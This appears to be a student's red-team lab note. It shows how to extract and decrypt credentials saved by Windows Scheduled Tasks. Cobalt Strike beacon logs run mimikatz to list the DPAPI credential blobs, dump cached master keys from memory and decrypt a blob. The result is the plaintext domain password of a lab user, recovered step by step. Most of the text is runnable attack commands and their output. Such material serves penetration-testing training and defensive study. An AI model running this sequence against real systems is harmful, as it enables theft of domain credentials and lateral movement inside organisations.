
*I believe that this section should go before [[2. Credential Manager]]* 


*Scheduled Tasks can save credentials so that they can run under the context of a user without them having to be logged on.  If we have local admin privileges on a machine, we can decrypt them in much the same way.  The blobs are saved under `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`.*

```bash
[12/05 20:30:01] beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
[12/05 20:30:01] [*] Tasked beacon to list files in C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
[12/05 20:30:01] [+] host called home, sent: 106 bytes
[12/05 20:30:01] [*] Listing: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 528b     fil     08/16/2022 14:55:28   F3190EBE0498B77B4A85ECBABCA19B6E
```
`dpapi::cred` can tell us the GUID of the master key used to encrypt each one.

```bash
[12/05 20:32:30] beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E
[12/05 20:32:31] [*] Tasked beacon to run mimikatz's dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E command
[12/05 20:32:31] [+] host called home, sent: 814410 bytes
[12/05 20:32:32] [+] received output:
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : ac1b10de6cfecc80e0ea8fec5dfa72ffc8eda7142d5b2c97d3d77884fd345daf
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 3a19b552f9cd20f840490e24bee29039cc72f9032fae15794f3a41884085e1af
  dwDataLen          : 00000100 - 256
  pbData             : dee44544db61ba672f07f78ce9f6b8d04cb428edc5bc5a9b5538bba0616403c6743b5e2837f047b30a6fc7b6466a0e07913c52e9a29f0d0ffe643941a7145cfab6abb1b15bbf1c5f47a76398778ed3a7c24bff957792a99e029de6f8dde86c84f5cceaa1d191d5332205ea28462b4da5bbe44889b038df8a88d413e4d62505bee27abf6ce5e5e6e310d4fcfff9eb76edcbc730a62884746bc8588e3051df65af1639175b95086dcf37995bd45785b28c9ce5f93f58841e4339144c46b35313f360f870312046d199a8110b486d29f776be141d2385a2d6d0eae2925dee8fdc529d2b9cce4cc22aeadf5f63721f2362402a8aa60c13c10ee76cf26e1585e07a17
  dwSignLen          : 00000040 - 64
  pbSign             : bce6d8a2679df1074a520c0eb4904ec3cc8eb812cafe42d08f2a80f5741af636997a536cecc3f03b731bcabe4420295ca39cf3f970664f04108a4d32cf2a0cf9
```
`sekurlsa::dpapi` to dump cached keys.
```bash
[12/05 20:33:11] beacon> mimikatz !sekurlsa::dpapi
[12/05 20:33:12] [*] Tasked beacon to run mimikatz's !sekurlsa::dpapi command
[12/05 20:33:12] [+] host called home, sent: 814415 bytes
[12/05 20:33:15] [+] received output:

Authentication Id : 0 ; 1691832 (00000000:0019d0b8)
Session           : RemoteInteractive from 2
User Name         : bfarmer
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 12/5/2023 7:08:52 PM
SID               : S-1-5-21-569305411-121244042-2357301523-1104
	 [00000000]
	 * GUID      :	{7d172001-f8ff-4ebd-9d0f-efd617237987}
	 * Time      :	12/5/2023 7:39:07 PM
	 * MasterKey :	b21c578ec83b972ad677d9cff5f47b65821363c5a3fc0418ee3ba516b4f069e6dec6fa527463888df8dd7bedd9ccdf7dda333da9b589f9c6f4e37ab3fc058437
	 * sha1(key) :	80befa99a67f68357df69128a046b6e131c0a791
	 [00000001]
	 * GUID      :	{bfc5090d-22fe-4058-8953-47f6882f549e}
	 * Time      :	12/5/2023 7:32:25 PM
	 * MasterKey :	8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
	 * sha1(key) :	897f7bf129e6a898ff4e20e9789009d5385be1f3
	 [00000002]
	 * GUID      :	{41586325-5912-4126-80d5-3ba667f5eca3}
	 * Time      :	12/5/2023 7:09:03 PM
	 * MasterKey :	15182fbf0ac7d6752521db1f726288f93e8f0d36bf86008ea6cdff1765707a92cd7de84391ec56c9589b5b04ce25100e1d6e493b8c6523881b5007a6765ad8da
	 * sha1(key) :	efc9bdd640a2f15691462edb12027baeaa0c06da


Authentication Id : 0 ; 1691488 (00000000:0019cf60)
Session           : RemoteInteractive from 2
User Name         : bfarmer
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 12/5/2023 7:08:52 PM
SID               : S-1-5-21-569305411-121244042-2357301523-1104


Authentication Id : 0 ; 1647516 (00000000:0019239c)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/5/2023 7:08:49 PM
SID               : S-1-5-90-0-2


Authentication Id : 0 ; 1647017 (00000000:001921a9)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/5/2023 7:08:49 PM
SID               : S-1-5-90-0-2


Authentication Id : 0 ; 1642479 (00000000:00190fef)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/5/2023 7:08:48 PM
SID               : S-1-5-96-0-2


Authentication Id : 0 ; 392082 (00000000:0005fb92)
Session           : Batch from 0
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 12/5/2023 7:03:17 PM
SID               : S-1-5-21-569305411-121244042-2357301523-1105


Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/5/2023 7:02:12 PM
SID               : S-1-5-19


Authentication Id : 0 ; 52317 (00000000:0000cc5d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/5/2023 7:02:11 PM
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 52299 (00000000:0000cc4b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/5/2023 7:02:11 PM
SID               : S-1-5-90-0-1


Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WKSTN-2$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 12/5/2023 7:02:07 PM
SID               : S-1-5-20


Authentication Id : 0 ; 31095 (00000000:00007977)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/5/2023 7:02:04 PM
SID               : S-1-5-96-0-0


Authentication Id : 0 ; 31096 (00000000:00007978)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/5/2023 7:02:04 PM
SID               : S-1-5-96-0-1


Authentication Id : 0 ; 29978 (00000000:0000751a)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/5/2023 7:02:00 PM
SID               : 


Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WKSTN-2$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 12/5/2023 7:01:58 PM
SID               : S-1-5-18
	 [00000000]
	 * GUID      :	{64742d69-55f4-43ba-819e-2558f8531a45}
	 * Time      :	12/5/2023 8:30:45 PM
	 * MasterKey :	1afa1b0850dc192a0c49c8c414a54d9b53b0d57704a7b83fa747c251d74932636a2bc0811874c0b4c4d31b4c37f6802709f142801b19b84f51ec4739236d0d7d
	 * sha1(key) :	1cddd0947bb10d8d1c26877bd59ae71822796c9d
	 [00000001]
	 * GUID      :	{9a7dc88b-4f53-457b-b906-b5fb93cf9acf}
	 * Time      :	12/5/2023 7:57:10 PM
	 * MasterKey :	268c071fceff8f2f1a2ae11f3ce5e7699587fb0f61ac722c27f89e5fe116f867cd1320fd8c367d32697b09b8ba59540c95aa1f7590d5a2dbdb296dda2d6f6ad0
	 * sha1(key) :	6026b14e2abcf5aeda0214aacec25ede296eeeff
	 [00000002]
	 * GUID      :	{02f5ff31-55e9-4c47-bd99-9a1c5839b227}
	 * Time      :	12/5/2023 8:30:45 PM
	 * MasterKey :	39defd0d11808b4f82918f8c012f9fd963800be1e818808ae2ec85b13b6a6a7788a21f21b03c96f384151e30e6f625c665d9c2e94251b13b61aad4f6d3f76af9
	 * sha1(key) :	c6e4aea29ea2c3631f1e49447fbb69c6886608e3
	 [00000003]
	 * GUID      :	{aaa23e6b-bba8-441d-923c-ec242d6690c3}
	 * Time      :	12/5/2023 8:32:45 PM
	 * MasterKey :	10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
	 * sha1(key) :	cfbc842e78ee6713fa5dcb3c9c2d6c6d7c09f06c
	 [00000004]
	 * GUID      :	{edd9d13b-33c8-4e75-9930-342a80dd804f}
	 * Time      :	12/5/2023 8:32:45 PM
	 * MasterKey :	193b865041046eec1e8a571e1add7ec2c7e6a70f6dfdf0c8c930c2bbc02d82f1ed69ea711d513b4e2db049972900224723af27be0c315d61a9556fb34a9431e4
	 * sha1(key) :	9f3b0b27a61870b9fde5438051e180bcc1e1516f
	 [00000005]
	 * GUID      :	{5de0381f-96bb-4037-8edc-084d9a52a118}
	 * Time      :	12/5/2023 8:30:27 PM
	 * MasterKey :	800b649d9a7e9fb841c75ab76f9a1a02009913de1fcad9a75af375d25d49f8937d9749641f44a19dab5bf9b9d647322f9296a3140e3ebf9eabf9892ffb40ff4b
	 * sha1(key) :	254047b715ba620257f424cf408256cdf94a5ad7
	 [00000006]
	 * GUID      :	{f8b07b52-5dfc-48a0-8daa-561dd486c8da}
	 * Time      :	12/5/2023 7:02:04 PM
	 * MasterKey :	87e70d01193999fa1e5c70161fee4d2184cc293762740e6a9d478256bb77af5d05f819b7b426aa2468279388f96337cc79ea1488cdf73cc10629a0f202ecfc9a
	 * sha1(key) :	49f43aa664e8952b90757f3c3ae9f70e732f997c
```
And then decrypt.
- have to try every master key to find the one that works.

`mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9`
```bash
[12/05 20:34:18] beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
[12/05 20:34:18] [*] Tasked beacon to run mimikatz's dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9 command
[12/05 20:34:18] [+] host called home, sent: 814410 bytes
[12/05 20:34:20] [+] received output:
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {aaa23e6b-bba8-441d-923c-ec242d6690c3}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : ac1b10de6cfecc80e0ea8fec5dfa72ffc8eda7142d5b2c97d3d77884fd345daf
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 3a19b552f9cd20f840490e24bee29039cc72f9032fae15794f3a41884085e1af
  dwDataLen          : 00000100 - 256
  pbData             : dee44544db61ba672f07f78ce9f6b8d04cb428edc5bc5a9b5538bba0616403c6743b5e2837f047b30a6fc7b6466a0e07913c52e9a29f0d0ffe643941a7145cfab6abb1b15bbf1c5f47a76398778ed3a7c24bff957792a99e029de6f8dde86c84f5cceaa1d191d5332205ea28462b4da5bbe44889b038df8a88d413e4d62505bee27abf6ce5e5e6e310d4fcfff9eb76edcbc730a62884746bc8588e3051df65af1639175b95086dcf37995bd45785b28c9ce5f93f58841e4339144c46b35313f360f870312046d199a8110b486d29f776be141d2385a2d6d0eae2925dee8fdc529d2b9cce4cc22aeadf5f63721f2362402a8aa60c13c10ee76cf26e1585e07a17
  dwSignLen          : 00000040 - 64
  pbSign             : bce6d8a2679df1074a520c0eb4904ec3cc8eb812cafe42d08f2a80f5741af636997a536cecc3f03b731bcabe4420295ca39cf3f970664f04108a4d32cf2a0cf9

Decrypting Credential:
 * masterkey     : 10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000fc - 252
  credUnk0       : 00004004 - 16388

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 8/16/2022 2:55:28 PM
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:batch=TaskScheduler:Task:{86042B87-C8D0-40A5-BB58-14A45356E01C}
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : DEV\jking
  CredentialBlob : Qwerty123
  Attributes     : 0
```